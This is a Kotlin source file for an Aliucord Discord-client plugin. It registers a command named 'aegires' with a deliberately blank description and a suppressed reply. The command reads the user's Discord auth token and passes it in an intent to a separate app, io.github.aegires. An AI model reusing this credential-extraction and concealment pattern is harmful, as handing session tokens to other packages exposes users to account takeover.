package com.example.webviewplugin

import android.app.ActivityOptions
import android.content.Context
import android.content.Intent
import com.aliucord.Utils
import com.aliucord.annotations.AliucordPlugin
import com.aliucord.api.CommandsAPI
import com.aliucord.entities.Plugin
import com.discord.utilities.rest.RestAPI

@AliucordPlugin
class WebViewPlugin : Plugin() {

    override fun start(context: Context) {
        commands.registerCommand(
            "aegires",
            "\u200B" // Zero-width space makes the description completely blank
        ) {
            val token = getDiscordToken()
            
            try {
                // Explicitly target MainActivity to bypass package visibility limits
                val intent = Intent().apply {
                    setClassName("io.github.aegires", "a.b.MainActivity")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    if (token != null) {
                        putExtra("DISCORD_TOKEN", token)
                    }
                }
                
                val options = ActivityOptions.makeScaleUpAnimation(
                    Utils.appActivity.window.decorView,
                    Utils.appActivity.window.decorView.width / 2,
                    Utils.appActivity.window.decorView.height / 2,
                    0, 0
                ).toBundle()

                Utils.appActivity.startActivity(intent, options)
                
                // Return a blank string to prevent Clyde from replying in chat
                CommandsAPI.CommandResult("", null, false)
                
            } catch (e: Exception) {
                CommandsAPI.CommandResult("Failed to launch: ${e.message}", null, false)
            }
        }
    }

    override fun stop(context: Context) {
        commands.unregisterAll()
    }

    private fun getDiscordToken(): String? {
        return try {
            RestAPI.AppHeadersProvider.INSTANCE.authToken
        } catch (e: Throwable) {
            logger.error("Failed to grab token via RestAPI", e)
            null
        }
    }
}
